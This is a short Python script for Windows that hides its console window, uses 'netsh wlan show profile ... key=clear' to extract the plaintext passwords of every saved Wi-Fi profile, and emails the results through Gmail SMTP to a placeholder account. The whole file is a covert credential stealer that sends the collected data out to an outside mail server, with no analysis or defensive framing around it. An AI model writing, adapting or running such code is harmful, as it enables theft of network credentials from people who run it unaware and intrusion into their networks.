import requests
import subprocess
import smtplib
import re
# this import allows us to use winapi to hide the console
import win32console, win32gui

#hides console
def consolehide():
	wm = win32console.GetConsoleWindow()
	win32gui.ShowWindow(wm, 0)


def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()


command = "netsh wlan show profile"

consolehide()
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
	command = "netsh wlan show profile " + network_name + " key=clear"
	current_result = subprocess.check_output(command, shell=True)
	result = result + current_result


send_mail("yourid@gmail.com", "yourpass", result)


